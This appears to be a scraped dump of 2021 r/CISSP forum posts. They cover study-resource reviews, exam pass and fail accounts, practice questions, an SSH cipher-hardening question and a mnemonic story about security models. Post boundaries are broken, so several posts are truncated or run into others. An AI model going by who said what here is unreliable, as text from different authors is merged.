So... I kind of get nervous when it comes to studying and try to [get every resource](https://imgur.com/utz3mdE) I can find.  Which is a bit overkill, but at least I can see what sticks with me.  Admittedly, I'm more of a visual learning than a textbook reader.

**Thor Teaches on Udemy**    
This was my main resource, and where I gained the most knowledge.  I would load up these videos whenever I could focus and stare at the screen.  I even picked up a Microsoft Wireless Display Adapter so I could cast my browser on my Surface to my TV and sit on my couch and listen.  Great content, and his notes were fantastic.  I ended up printing out all his PDF notes and putting them in sheet protectors in a binder.  The only thing that sucked is that by grouping the lessons into two-domain courses, some courses (like the one that includes D3 & D4) end up being much higher value than the ones that focus on smaller domains.  Still, I'd highly recommend the series.  9/10

**Certification Station on Discord**    
This server on Discord was fantastic.  It really kept me motivated, and helped me work through the thought process on various questions.  If you stay active in the channel, you'll end up doing hundreds of practice questions without even thinking about it.  11/10

**MindMap videos by Rob Witcher on YouTube**    
I'm pretty sure I'm responsible for hundreds of plays on these videos.  These videos became my main audio source while walking or driving to work, and I'd even listen to them as I went to sleep.  It's a great way to refresh important topics as well as quickly go over a chapter before diving into it with a main resource.  And they're free.  Not enough deep info to learn everything, but just about the perfect  review resource.  You're crazy if you don't utilize these.  10/10

**CISSP Cert Prep (2021) by Mike Chapple on LinkedIn Learning**    
Some people like Mike Chapple's teaching method, and some don't.  But his updated LinkedIn Learning videos are very well produced, and include chapter quizzes to make sure you're taking in information rather than just zoning out.  It was another source I used primarily for audio, or for getting another perspective on a confusing topic from Thor's videos.  I do think it sometimes focused on less important things and glanced over big topics, but that may be because the course is designed to go along with the Official Study Guide textbook.  7/10

**Kelly Handerhan's CISSP course on Cybrary**    
Kelly is very passionate about what she teaches, which helps keep you motivated, but this video series really lightly glosses over the information.  It can serve as a good review or refresher, but shouldn't be your main video source.  However, it's free, so still nice.  5/10

**Adam Gordon's notes**    
So everyone on Certification Station knows of Adam's notes, which are freely available on the Discord server.  They've been formatted into a nice format by some users in the server that have made reading a lot easier.  I'm not sure if his ITPro.TV course offers something nicer, but I'd say the only thing these notes lack is looking nice and organized.  Otherwise, they are FULL of information and tricks to help remember certain things.  I'd highly recommend reading through these at least once.  8/10

**ISC2 CISSP Official Study Guide (2018)**    
Honestly, I didn't use this much.  I tried to read through it, but I felt it really dragged on through certain topics.  There's no reason Domain 2 should get as many pages as it does.  After reading through a few chapters, this became more of a reference book.  I'm sure it would be great for those that can read through it in full, but I couldn't do it.  6?/10

**CISSP Study Guide (3rd Edition) by Eric Conrad**    
I picked this book up because it was shorter than the OSG.  Where the OSG wanted 140 pages for something, this book covered it in 60.  Most of the reading I did came out of this book.  I highly preferred the condensed design, but the book was certainly showing its age.  This ""latest"" edition is from 2016, and could do with some updates.  6/10

**CISSP For Dummies (6th Edition)**    
I felt this book was great!  I don't see it recommended here enough.  It's from 2018, so reasonably updated.  I didn't read it through fully, but I could see it being a very competent primary reading source.  I used it mostly for reference to double-check things that didn't make sense in my video studies, or practice questions that confused me.  The only thing really lacking in this book is that the site for redeeming the online practice exams is defunct, so you have to call their support line to get an activation code on their new site.  Not a huge issue as I didn't really use their practice questions, but a noticeable issue.  It's also still smaller than the OSG.  7/10

**11th Hour CISSP by Eric Conrad**    
This book was just ok.  I bought both the physical and Audible versions.  Some people said they used it as a review after going over everything, but I think it's too light for that.  I think it would do well as an introduction book when you're first starting your studies and want to dip your toes into each domain first over the course of 200 pages.  Nothing to really learn much info from, but a good way to understand the general topics you'll be diving into.  5/10

**The Effective CISSP by Wentz Wu**    
This book is designed to be a focus on Domain 1 and 2, with a touch of 3.  For the most part, it does that.  I was expecting it to go into further detail than what I had already learned, but that wasn't really the case.  If you've paid attention in your primary study source, this will mostly just repeat what you've already learned, but that can be nice if it's been a while since you went over these topics.  It does give a good description between various steps and such.  Is the book necessary?  Not really... but if you want to hammer in these particular domains, it's a nice addition if you have time.  7/10

**How To Think Like a Manager by Luke Ahmed**    
I'd definitely recommend this book.  It's cheap, and goes over 25 questions and the thought process you should go through.  Best of all, it goes through a VARIETY of questions you would go through, such as ""pick the best out of a list of potentially correct answers"", ""you can easily eliminate two of these"", ""the actual question is asking you for something that can specifically be answered by only one of these"", etc.  The only issue I had with the book was one question (Q14) that focused on firewall architecture ""tiers"", which is not listed in any textbook, and the only video source I could find was one by Luke, and I still couldn't determine what a ""three-tier 2"" architecture and such were.  I spent a couple hours trying to figure this out, but then all of Certification Station agreed it didn't make any sense, and wouldn't show up in the exam, which it didn't.  8/10

**CISSP Exam Guide Ultimate Edition 2021 by Walter Roberts**    
Look... Stay away from this.  It's useless.  The layout is terrible, it looks like it was typed up in Microsoft Word and printed, it skips over important information, and focuses way too heavily on stupid stuff (we don't need two pages on what Malware is).  When I was going through my CCNA studies, I found a cheap book on Amazon called ""CCNA 200-301 Quick Reference Guide"" that was like $12, and 112 pages.  It included all of the exam objectives with a brief description and notes about each objective, allowing the reader to quickly reference each objective and see if they knew the topic or needed to read more.  I was looking for a cheap book that did something similar... just a quick reference of each topic so I could determine if I've missed something.  This book was not that.  At all.  The only reason it gets any points is because it was cheap.  2/10

    Practice Exams  & Quizzes

I used a ton of practice exams and quiz sources... I used the official ISC2 practice exam book, I used CCCure, I used practice questions from all the textbooks above, I used the new Pocket Prep app (whatever it's called now), Wentz and Adam's Q of the Day, etc.  Certification Station itself is a huge conglomerate of practice questions from various sources, so its hard to tell which one was which.  I wouldn't say I went through thousands of questions like many people here... probably a total of like 500-600.  Like many people here say, the practice exams are not like the real thing.  There may be a question or two that pop in and seem similar, but generally those questions are freebie questions anyways (straight to the point definition-like questions).  What I really aimed to do was identify my weak spots and then study those sections.  For me, the new Pocket Prep app was really useful for this because it gives a readout of your proficiency in each domain so I could see which ones I was lacking, and then go back and review those.

But honestly?  Whatever you're using is probably fine.  Don't be like me and waste a huge amount of time and money trying to find the ""best"" practice exams.  There aren't any, and ISC2 send C&D's to people who create questions too similar to the real thing (like with Wentz).  So you're not going to find perfect practice questions.  Just find something that helps you pinpoint your weak spots, and then review those sections.  The best thing you can do is practice and test your knowledge, so just find something and study.  Try to use a couple resources if you can so you can get a variety.

    In Closing...

The exam was tough.  I'm still surprised I passed, but it's encouraged me to continue my studies.  I wouldn't say I'm wayyy more knowledgeable than I was before I started studying... but that may be because I had a good basepoint.  I certainly learned a few interesting and useful things, and hammered down some stuff that I lightly touched on in other certs.

I plan on taking CISM next since the material is similar.  A lot of people just said to go take a few practice exams and then take the real thing, but I want to read through a bit before taking it, as I still feel like there are some CISSP topics I'm not too familiar with.  After that, I'm hoping to either jump into CySA+ or eJPT... I just feel like I've taken a lot of certifications involving knowledge and procedures, but I still have a huge feeling of Impostor Syndrome, and I don't feel like I have as many practical skills as I'd like.  I was offered a few ""Senior Security Analyst"" positions just minutes after posting that I passed the exam, but I still feel too inexperienced.  So overall I'm trying to find something that can prepare me for a more security-centric job.

Sorry for the novel here... just trying to be thorough.",2021-08-09
1845,p18g19,"Failed, 150 Questions","Today I sat for the CISSP exam and failed at 150 questions. I scored Below Proficiency Level on 4 of the domains, and  Near Proficiency Level on the other 4. Looking at how i was graded on the test I wonder how I even made it to 150 questions(I was likely not a few questions away from passing). I mainly studied out of the Cybex book and the practice questions included, the mindmap series on YT and loosely following Kelly Handerhan on Cybrary, as well as help from you all on this subreddit!

It has discouraged me and I'm leaning towards not sitting for a retake.

1846,p0pej1,How/do I earn CISSP CPEs for reading other related cert books?,"Hi everyone!

1847,p0gh9k,"Passed, 100q","Been seeing a lot of ""Passed!"" posts so thought I'd throw in my experience.

Just took the exam last night and passed at 100 questions at a little over an hour.

The key takeaway I want to pass on to you if you're studying: ***you can do it!***

Personal history: I'm old enough to have 2 kids in college, been doing IT and security since my career started in 1994, and I was a computer science major.  I've been involved in SOC audits, written security policies, and consulted with lots of companies regarding how to secure IT assets properly, including extensive HIPAA consulting.  Branched out and got EnCE forensic certification in 2014 and have been doing forensics and testimony in civil cases since then in addition to the other consulting.  Lots of other certs as well, including the suite of CompTIA and Microsoft. In a word, I have experience, and I know how to take tests.

I'd thought about getting CISSP starting in about 2010 but had put it out of my mind after seeing the commitment it takes to get it, and the Shon Harris book just sat on my shelf for 10 years afterwards.  Plus, I couldn't justify the cert as bringing anything to my resume that I didn't already have.  A colleague of mine wanted CISSP really bad though, so as a challenge I told him I'd go for it too.  We could study together and push each other along.  

2021 was our year, even with the exam being updated.  He is scheduled to take his in October and I've been encouraging him to study more, but life has a way of telling you that your focus needs to be on other things like family and work.  Same applied to me, but I started just giving myself little 10 or 20 question quizzes in between other obligations, or slipping in a Youtube video or a quick read of a few pages.  Eventually the quizzes worked up into 50 questions, and then I took full on 150 question exams.

Resources that are invaluable:

* RELEVANT EXPERIENCE.  This is passable without experience, but if you have worked even tangentially to security, lean on it.
* TEST TAKING. Practice tests count for a TON and gets you in the mindset.  Don't cheat on them.  If you're struggling, make them smaller, even if it's just 1-5 questions.  Get to where you are comfortable and then work your way up.  Whether you miss a question OR EVEN IF YOU GET IT RIGHT, read the explanation and refer back to the books.  Retake missed questions.
* REDDIT. Read your colleagues' experiences, but also be aware that there are some amazing resources here, including the actual authors of study guides and books, and professional trainers.  They don't hide, and don't be afraid to reach out.
* YOUTUBE.  There's so many free videos out there, and many are wonderful at getting the fundamentals ingrained in your mind.

Things I didn't do:

* Read any book cover-to-cover.  I didn't have time or inclination.
* Keep testing myself on subjects I was already familiar with.  For example, I knew I was strong in forensics, but weak in encryption.  So I focused more on encryption until I got comfortable with it.

Specific tools I used to study:

* BOSON.  I will swear up and down that Boson is what got me through this.  They've updated to the 2021 material.  The explanations for answers are top-notch.  By test day I was scoring 95%-100% on full exams.  The only (\*tiny\*) complaint I have about it is that the online version of the test doesn't let you create a custom exam to skip questions you've already answered X number of times, which the local installation does.
* CISSPREP. I hated this test bank with a passion, because it was so hard.  I never broke about 65% on it.  However, its questions really made me think, and were not just rote memorization answers.  I can definitely see the value in the questions it asks, but that doesn't mean I enjoyed taking them.
* ALL IN ONE CISSP EXAM GUIDE, 5th edition.  This one is a carryover from 2010 but was still really helpful, particularly in how security models came to be.  I'd obviously recommend getting the latest edition, but even the older ones still have merit.
* CISSP CBK 2015.   Also older, but still has merit.  Obviously don't seek out an older CBK, but work with what you have, and if someone gifts you older books or you have something in your personal library, don't throw them out.
* Most of all, /u/benmalisow one of the aforementioned authors and trainers active on /r/cissp, who was extremely generous with his time and helpfulness.

As I said above, ***you can do it!***  

It's challenging, yes.  

It's not the hardest test I've ever taken (EnCE was exponentially harder) but I did stop at some questions and just stare at them for a couple of minutes.  Other questions I answered in about 10 seconds.

With that said, the most applicable credential to what I do now is the CISA, but everything I've heard suggests that it's not that challenging for someone with a strong auditing background.

However, I don't have a strong background in IT or good study skills, so I'm thinking that taking the Sec+ and Network+ first would make the most sense; the area I'm unfamiliar with is how much those two relate to the CISA.

After an intense 5-day training course and a week of practicing exam questions, I took and passed the CISSP exam. It took me a little over an hour before I got the notification that the test was over. I just wanted to share my experiences for anyone who is planning to take the exam.

As many have already pointed out, the real exam is quite different from the practice exams. That doesn't mean that you'd be wasting your time doing the practice exams though.

In my experience, memorizing the correct answers (from practice exams) will not help you to prepare for the real exam. However, doing the practice exams can help you to read the questions (very) carefully. Sometimes, it takes only one word to completely change the meaning of the question (and subsequently the correct answer to it). When doing practice exams, I noticed that I usually finished them a lot faster than required. This encouraged me to take my time during the real exam.

I found the questions from the real exam to be more varied and less ""gruelling"" than the practice exams. 

One piece of advice I can give you is to really take the time to read and understand the question carefully. You have more than enough time to read it multiple times but once you answer it and move to the next one, you can't go back.

I used my previous exam knowledge and the ninth edition of the ISC^(2) Official Study Guide (Stewart, Chapple, and Gibson). Most importantly, if you don't pass, don't give up!

Edited to add: I also used my score report from previous exams to focus on the areas I was weakest. I think this helped keep my weaker subject areas top of mind for the exam. Use this to your advantage if you have it.",2021-08-03

I have been studying for the CISSP exam for the last few months, thanks to covid none of the testing centres were open for a while therefore I lost my drive to study as hard as I would have liked.   


I find myself getting tired of reading the books really quick and wanted to change it up to try practice exams to help me focus on the holes in my knowledge.   


I have been recommended by a colleague to try the Boson practice exams but I hear the questions are not always completely accurate and given the $99 dollar price I want to be sure of what I am buying.

I've completed CISM & CRISC in the last few months. 

Looking to move to CISSP now, starting with OSG 9th edition.

My main conern is which practice questions tests are really close to CISSP exam like ISACA certifications have QAE?

Does OSG 9th edition practice questions are enough or should I refer others too like ISC2 official practice tests, BOSON, Luke Ahmed, Pocket Prep, CISSPprep, Shon Harris questions & Thor teaches? (These lists are overwhelming and I'd like suggestions how can I filter it down to practice questions sets which is closer to the actual exam please?)

1872,owdfw6,Fun CISSP Practice Question,"\*\*Admin(s) Please Delete If Not Helpful\*\*

By the end of 1989, the price of ROM chips was dropping enough that Capcom game designers Akira Nishitani and Akira Yasuda began their ambitious plan for Street Fighter 2. Senior management asked the two designers to stay in-line with the original game and keep it straight forward. Management also asked for a quick turnaround to compete with other upcoming game releases such as Midway’s Mortal Kombat.

While the designers wanted to stay within the confines of the original game structure, they also wanted the freedom to try new things during development with the new ROM chips. Their goal was to create a list of skilled and iconic characters each with their own special abilities. For example, the additional memory space allowed the character Guile to have his Low Kick flipped to look like an upside-down air kick. And as Dhalsim’s limbs started getting longer and longer with each development iteration, it could be counter-balanced by making the character move slower. E. Honda’s flying attack and Chun Li’s Spinning Bird Kick were also newly added memory spaces on the ROM boards. These moves pushed the game from realistic to unrealistic, and added to its charm.

48-bits of data were allocated on the game boards to accommodate these changes.

This resulted in characters slowly increasing their assigned memory while in production and sometimes required a quick fix. In order to make these constant changes, Nishitani and Yasuda needed an accelerated development process with the final end-result already defined, but with the flexibility to allow for improvements while prototyping designs, going back and cutting animation frames for memory conservation, and re-examining system motherboard architecture. The designers needed the ability to constantly build, demonstrate, and refine their game animation changes.

Which of the following software development models would best fit this environment?

A. Waterfall method  
B. Rapid Application Development  
C. Joint Application Development  
D. Spiral Model

1873,ovz7o7,CISSP Passed in first attempt,"Hello Everyone,

I provisionally passed my CISSP exam yesterday.

The exam was Ok in the beginning and I it was brutal after 20 questions, and I never felt that I am going to Pass it. I feel it tests your patience as well during the exam.

I spent around 30 minutes for first 15 questions and started increasing my speed after 60 questions, when my exam  finished I was having 50Q and 50 minutes left.

&#x200B;

IMPORTANT \*\*\*\*\*\*\* Try to write your notes in the sequence/way that exam expects from you.. Like Advantages/disadvantages of each thing e.g. RBAC, Access models (Write them in series from Most to Least, Primary and Secondary etc.). It will help you with the exact mindset of the exam...

Reading book is very important..

&#x200B;

Resources I used:

&#x200B;

Sybex OSG 8th edition

11th hour

and Adam's Bootcamp noted from Discord

Thor's Udemy course and old question bank

Kelly's Cybrary Course to refresh the knowledge

BOSON and Sybex Official practice test (recommended)

Luke Ahmed's subscription (too much information in the questions, in exam questions are pretty small 2-3 lines max and will clear descriptions)

CISSPrep Question (not same like exam, don't take these question near to exam. If English is not your first language then it will give you some tough time, but it may improve your thinking skill)

&#x200B;

Again, This is my experience, I didn't like the lengthy questions but if it works for you then it is good else don't spend too much time and move on..

&#x200B;

One recommendation, scores of the practice questions is not relevant, I was getting 40%-50% in Luke questions, which was kind of demotivation for me, so I just completed them without looking at the result.

Still, I managed to passed at 100Q, I was still feeling that I am not fully prepared (even after passing the exam :D )... so you will be never prepared the exam....

The new Questions of Sybex Official guide are better than previous version.

I am aware that a person who doesn’t have the required experience to become a CISSP may become an Associate of (ISC)² by successfully passing the CISSP examination and then will have six years to earn the five years experience.

1875,ovu73a,Standard and safe ciphers,"
I am checking some Linux servers and can see ciphers for basically two: SSL and SSH.  For SSH I can see some deprecated ciphers like CBC, MD5, arcfour which needs to be removed. if I categorize ciphers for SSH, then they are 4 types: 1. Kex (diffie-hellman-group-exchange-sha256) 2. Server host key (rsa, dss) 3. Encryption (ctr, aes, chacha20-poly, cbc etc) 4. Mac-algorithms (hmac-sha2-256). 5 Compression (none)
1.	Could there be ciphers for other services else than SSL and SSH too that needs to be checked?
2.	Getting rid of older and deprecated ciphers (like arcfour, md5) are obvious but what about removing kex algorithm (like Diffie Helman), or Chacha20-poly etc?  Is there a standard list of ciphers for Linux servers, something recommended by NIST or else?
3. Will removing ciphers cause compatibility issues?

1877,ovm35i,Failed today at 150 questions,"Welp...i kinda saw that coming. I felt very unprepared the 2 weeks before the exam. The more i crammed, the less i felt like i knew. Practice tests range from 50-68%, which was discouraging. 

I have a bachelor's in business management (2011) and a masters in information technology systems (2020). I work as a research analyst for a small tech company. My everyday job isn't technical or managerial, but i have done some light technical work here and there for the company the past 9 years I've been there. I thought the test was pretty technical. Especially domain 4, my greatest nemesis. 

Started studying beginning of May. I tried to read the shon harris book, but was overwhelmed (only got through 1/2 book) At the end of may, i took a few practice tests and got around 50%. Only studied about 3hrs on a good day, much less or none on busy days. 

June, used the 11th hour to get to know the domains and then go into detail with videos, research, and shon harris book. Started doing practice test questions every other day. Was feeling better in June.... Then life happened. Didn't study for ~3 weeks. I kept thinking i had time left to study in july. 

July comes and things don't cool downwith life stuff. I was thinking of rescheduling but my mom convinced me to keep my date. It will force me to study, which i agreed with. Didn't get any better. Was only able to study everyday for ~3hr. 

Took a week off work before the exam to cram. That was the bulk of my study time, but even on the week of, i studied 5-6hr. 

I think the practice tests i used were representative of the exam. The sybex practice questions were pretty good, especially in how it is worded. The questions were similar, but the answer choices in the actual exam were more tricky.
They were not as obvious as the practice tests. I was able to narrow questions down to 2 answers. I took too much time in the beginning 50q and didn't have enough time for the rest of the test. Ended up rushing the last bit. 

Knew i failed when the last few questions were straight forward and much easier. Got a lot of legal and regulatory questions that i didn't know because glossed over those in my studies.

Study materials: 
Shon harris all in one CISSP (mostly used to do practice tests. Did ~700q)

11th hour

Sybex 3rd edition practice tests (did ~200 questions. Bought too late in July) 

Destination mind map videos (watched each vid 2x + took notes) 

Cissp cram series (watched each video 2x + followed slides)

Day before exam listed to how to think like a manager by Luke Ahmed and eric conrad's cissp cram session 

My plan for the 2nd time (hopefully last): 
Boot camp. I'm really bad with self study and need some structure. Plus, can tell people in my life i have to go to school for a chunk of time

More practice questions. Want to do all the questions i have

Look for an audio book version of a prep book 

Study things in detail. Deeper understanding of the WHY! 

TLDR: didn't study enough, didn't pass. Time management and discipline are important. Cramming didn't work :(",2021-08-01

1884,ouob9r,Provisionally Passed Yesterday @ 150 Questions,"Hello all. I have been quietly following the CISSP reddit thread for the past two years. Before I get into the journey, I will tell you about my background. I have been in the IT industry for 15 years wearing many hats along the way. I was a managed services network engineer for most of it, although I also worked on systems and security in these roles. I was also an ISO/IT Manager for about four years in the financial industry. I am currently working as a network engineer in the media and broadcast industry. I currently hold CCNP r/S, MCSA/MCSE 2016, A+, Network+ and CISM.

&#x200B;

I have been studying for the CISSP off and on for the last two years. I was hoping to test in early 2020, but the testing centers closed for a while due to COVID. I studied the official study guide (read it cover to cover) and finished the 11th hour by Eric Conrad. This took about two weeks. I tried to read the Shon Harris edition, but I wasn't captivated by the writing style. It felt like reading a dictionary. The official guide was still a hard read, but I was able to keep up with the progression. I also used several practice tests including: the official practice tests, Boson, Shon Harris practice questions and PocketPrep. I would test myself on random questions and when I did poorly, I would review chapter material or concepts.

&#x200B;

After I learned that ISACA allowed online testing, I scheduled my CISM test for May of 2020. Unfortunately, I had technical issues logging into the exam environment so I was not able to take the test. Support did issue me a voucher to retake the exam, but I did not end up taking the exam until April 2021. Not wanting my voucher to expire, I studied the All-In-One study book for the CISM and used the QAE question bank to help (re)prepare. I thought both were essential for passing the CISM exam. I was able to pass the CISM when I took it in April 2021; thankfully I had no technical issues this time. The proctor had me scan the room, under the desk, etc. to ensure a secure test environment at home. It took about two weeks to have my work experience approved, maintenance fees, etc. until I was finally CISM certified.

&#x200B;

I told my employer about my new credentials and my interest in cybersecurity management. They requested I take the CISSP as it was viewed as a harder tested (I'll comment on that later). I ordered the ninth edition of the Official study guide and started my studies with a focused approach on my weak domains. I continued to use my practice tests to focus on these areas. I used PocketPrep and Boson for most of it. When I started using Boson, I was averaging 60-70%. After two months of studying, I was able to bring that up to 80-90% on average. I bought the CCCure questions, but only used them a few times. I heard on this forum that Boson was the best and I agree with that. I finally decided to schedule a date and get it done. I picked 7/29 as my test date and I was a nervous wreck leading up to the exam date. I felt I understudied, unprepared, etc. even though I have been studying hard for the last several months. I read the 11th hour book cover to cover to brush up on my topics. I read this until the late morning on the day of my test. My test was at 2 PM. I also watched the Kelly (Why you will pass the CISSP) video and Larry's videos and they will essential for gaining the right mindset. DON'T FIX ANYTHING!!! Cost benefit analysis for each solution. Management answers are always applicable. Focus on human life.

&#x200B;

I did a few Boson practice questions in the parking to get into the mindset of reading the questions slowly (once, twice), reading the answers slowly (once, twice). All the time to think like a manager, not an engineer. My heart rate was up and I was stressing out. I finally made my way into the testing center for the moment of truth. After the palm scans, NDA and all the processing, I finally started the exam. What I read on this forum was accurate. These were like no questions I have ever seen in my practice test bank. I had a handful that were like that, but most were scenario based. You have to completely understand the concepts and when to use them. I would read the question two or three times, figure out what they were asking and then select the appropriate or best answer. I also proved the other answers were incorrect or less accurate than the answer I chose. Several questions were way out of left field and I used an educated guess to eliminate the wrong answers. After going past 100 questions, I really thought I was headed for failure. I was thinking, all that studying and it is still not enough. I even visualized my next steps, like attending a boot camp. Nevertheless, I continued to answer each question as if it would make or break my passing grade. I finally got to question 150 with about an hour left and clicked finish exam. I was surprised it didn't have a survey like the other exams I have taken.

&#x200B;

I had to go through the checkout process (ID and palm scans again). The proctor verified my name on the printout and I noticed when she was holding it, it did not have bar graphs like I heard similar to a failure report. When she handed it to me, I saw ""Congratulations"" and said aloud, ""Well I wasn't expecting that."" haha I'm so glad I stuck with it and continued to fight for the win. I feel the networking questions pushed me over the top since that is my strongest area. I know I didn't ace it at 100 questions, but I tried my best and that is all that mattered to me. I look forward to the future this certification will bring. If anyone has tips on staying on top of the CE's, I would greatly appreciate it.

&#x200B;

I feel the CISM will help prepare you for the CISSP, but while they are similar, they are also very different. The CISM is more management focused without the high level technical knowledge required for the CISSP. Both exams were very challenging. CISM is paramount if you plan to pursue a Infosec Manager role and analyzing/reporting risk to C-level executives. There is a lot of overlap between the two, but studying for one doesn't necessarily prepare you for the other without additional study.

&#x200B;

Whatever your journey may be, I wish you all the best and I'm happy to answer any questions that do no break the NDA.

Some of the available resources are Thor Pederen's HARD CISSP Practice Questions. So far these are the trickiest and most confusing practice questions I have come across during my prep. Sometimes I feel like they are purposely trying to trick me by using specific words which start to make me over think. I was wondering if anyone else has been using these and if they are also finding them confusing and also wondering how similar these will be to the actual questions I will see. I have provided a sample below.

 ""J**ohn is creating a username for a new employee, Frank Hornsby. The company guidelines recommend the username ""hornsbp1"". The new employee has requested the username ""cowboy"", and there are no accounts with that name. Which username is John most likely to create, and what is the BEST reason?** ""

a. Cowboys because guidelines are optional and cowboy is unique 

b. hornsbpi, because cowboy would be too conspicuous and may attract attackers

I have no factual background in IT or cybersecurity (I did get SEC+ in March). I’m an active duty Soldier who’s about to retire, and my specialty is in tactical radios and COMSEC.

Sources I used:

Study Notes and Theory - best overall source for content. The website and Facebook group are phenomenal. 

How to Think Like a Manager by Luke Ahmed - the 25 questions helped me with the manager mindset. Excellent!

Mike Chapple’s LinkedIn course - does a great job of delivering content, then applying it to real-world scenarios 

Sybex 8th & 9th editions 
Sybex Official questions
Shon Harris AIO
Wentz Wu The Effective CISSP
11th-hour study guide
Cissprep.net questions
Destination Certification videos by Rob Witcher

I also used Anki a lot and this subReddit group.

The Sybex content prepared me for the technical part of the exam, the questions on Study Notes and Theory as well as How to Think Like a Manager and CISSPrep.net prepared me for the manager mindset. Mike Chapple’s LinkedIn CISSP class put everything together for me.

1892,ou9y9l,86 First Practice Exam (Sybex 9E). Finish Other 3 Practice Exams?,"Have begun my CISSP studying, I just finished reading the OSG 9E over just about exactly 3 weeks from start to finish (Chapter a night average basically). A lot of the concepts were familiar as I wear a lot of hats at work (endpoint security, penetration testing, vulnerability management, application security, config management), but no management experience (technically still in a junior role, but manage all of the above more or less, yeah I know...time to move on up elsewhere).

I have just over 3 years experience overall, all in InfoSec right out of a Masters in CS (non-technical undergrad), so planning to take CISSP exam right around 4 year experience mark so I can officially get endorsed.

I'm guessing 86 on Practice Test is a good sign obviously, as I cover many domains in my day to day, and know where my weaknesses lie. But of course these aren't like the real questions...

Should I finish out these other 3 Practice Exams and see how I do? I don't wan't to exhaust my resources, since once you take a practice exam, that test is not a good gauge anymore since you know the questions.

1893,ou4xez,"Failed, 150 questions","So today I took my first CISSP exam and failed. I guess I am wondering is it possible to determine if I was close to passing or not? I was above proficiency on two domains, near proficiency on five domains and below proficiency on one domain. Now I understand that near proficiency isn’t enough but does near mean that I was a question or two off from being above? Ive read that if you are below on lower weighted domains it is possible that if you are above on higher weighted domains you can make up for it? 

How near to passing is ‘near proficiency’ 

I just wish they gave me a little more breakdown of how close I was exactly. I have been studying for the past 6 weeks( min. 4 hours a day) one week was a boot camp. I have 8 years security experience and 7 years system administration experience and thought I was doing everything right leading up to the exam. But after leaving the exam, I don’t know what to go back and review for my second attempt. Most of the questions were opinion based “choose BEST” answers which all of them were correct just had to choose the “more” correct answer. The domain I was below proficiency on , during my practice questions I was above 80% on, so I am just really discouraged and would appreciate any tips on how I should move forward.",2021-07-29

1895,ou390s,Passed this morning at 100q,"I have 24 years of IT experience and about 15 years in IT Security.  I've done everything from being a cable-jockey in 1997 straight out of high school to my current role of Deputy CISO for a large hospital.  I obtained the CISM in 2019.

My organization paid for an ISC(2) bootcamp and I had a fantastic instructor who provided excellent examples of ""demystifying"" complex subjects like encryption algorithms and frameworks.  I attended the bootcamp last week.

I only used the book as referenced by my bootcamp instructor and then occasionally during the ISC(2) official practice exams to review information that I missed.  I didn't read it cover-to-cover.

I also paid for a month subscription to the PocketPrep app to gain access to all of the questions and just hammered practice questions at night between my bootcamp last week and my exam this morning.

It stopped me at 100q after about 100 minutes.

I think experience had the biggest role in me passing.  I've done most everything covered by the domains, but there's also definitely a ""mindset"" that you have to put yourself in when you take the exam.  It was the same for the CISM.

I am so relieved to have it behind me... and want to encourage those of you that are planning to take it, book the exam now.  Having that ""deadline"" helps with the mental aspect of prepping.  You HAVE to do it if you have an exam appointment.

1900,otq9aj,About a question from the Wiley CISSP test bank...,"Greetings everyone. I attempted the Bonus Exam from Wiley's Test Bank today, and one of the questions asked about a packet analysis scenario.

The questions goes like this:

>While performing network packet capture analysis, you discover packets that seem odd. By looking into the packet’s raw hex display, you see that the byte offset position 0x2F has the value of 0x08. What was this packet attempting to make occur?  
>  
>A. Abruptly disconnect a session  
>  
>B. Confirm the receipt of a data set  
>  
>C. Start a graceful hang-up process  
>  
>D. Initiate a new session connection

I pick A, the answer that this shows a reset, to abruptly end the connection, and Wiley says I'm right. It provides the following explanation which I'll copy and paste here:

>The raw hex value of 0x08 in offset position 0x2F represents the binary number of 00000100. When this binary number is compared to the TCP header flag (i.e., the offset position 0x2F) layout of XXUAPRSF, it is clear the Reset flag is set. Thus, this packet is attempting to abruptly disconnect a session.

This seems strange, because 0x08 is binary 00001000, so the explanation is one position off.

The layout of the control bits is correct, XXUAPRSF, and RST is indeed 00000100. But, that means the hex value should be 0x04 in both the question *and* the answer / explanation.

Furthermore, the offset position for the TCP header flag should be byte offset 13, i.e. TCP\[13\]. Why does it say offset position 0x2F?

It seems as if Wiley made several mistakes here. Either that, or I am losing my mind. Can you guys weigh in?

One last point is that I hardly think questions like this will appear in the actual exam. Packet analysis seems too far down in the weeds. What do you guys think?",2021-07-29

I don't know if this idea is stupid/silly but I'm hoping it will help remember at the least the name and what each model does! The story may sound silly because I am just making this shit up, also my grammar sucks so please excuse me but I will write in a way so that each model is memorable :)

If you all like this, I can write more about other topics, so here goes nothing!

\-------------------------------------

It was a cold winter night in Virginia but it was hotter than ever in Washington DC with cybersecurity incidents across the Federal government. Something had to be done or else the USA was to going to lose the war against its enemies on the cybers fronts. We could beat anyone in physical battle, but how do we beat an enemy who knows no boundaries that you can't shoot or kill by a stealth bomber or a drone?

After being in traffic for hours on 66 East by the Key Bridge near Georgetown, Mr. Bell LaPadula had enough and took the exit near Roslyn to cross the bridge. ""Big mistake"" he explained ""the damn traffic worse up in here!"" After moving an inch every 30 minutes, he remembered why took this exit. He loved the view of the Potomak river, as the sun rose up over Kenndy Center. It was better than looking at a parking lot of cars.

Noticing how late he was running for work, he had no choice but to call his best friend Biba, a goofball who saw Mr. LaPadulla as this big military prick but loved like a brother nonetheless. They have been arguing for days about how to solve these Cybersecurity incidents. His biggest worry was to prevent insider threats, there has been a fear that there are Chinese spies now working in the ranks of the US government, they had found a way to get in and now no one could be trusted, not even our own...

Bell and Biba have been working together with Clark Wilson, an AirForce retire who loved sports cars, more especially Camaros, and their nerdy twin buddies Brewer and Nash who were obsessed with the Great Wall of China, but for some odd reason they always referred to it as Chinese Wall, LaPadulla never asked why... Together they made a great team solving the hardest IT Security problems.

However, Mr. Goguen Mesegur, a kiss-ass who was a title whore in the government world, always got in the way of LaPadulla. No matter how great of an idea he had, Goguen stopped him in order to push his own agenda. His biggest supports were Graham Denning, an IT Manager, and Mrs. Sutherland, an old-school mean lady who smoked way too many cigarettes, the type of person you wondered how she was still alive after smoking packets of cigarettes per day for many many years! If she called, you could even smell the cigarettes from the phone as soon as she said ""hello darling...""

1906,osz1a8,Provisionally passed the CISSP at 100 questions today,"Hello everyone,

&#x200B;

I studied for the exam for maybe 2 days and did a cramming session last night of some quizlet questions, read through eric conrad's 11th hour, reviewed concepts in the official study guide I didn't understand, watched youtube videos, and provisionally passed the exam at 100 questions. Let me start off by saying that I have about 10+ years of experience in InfoSec and most of the success of the exam was really not from the cramming session, but rather my real-world experience. 

&#x200B;

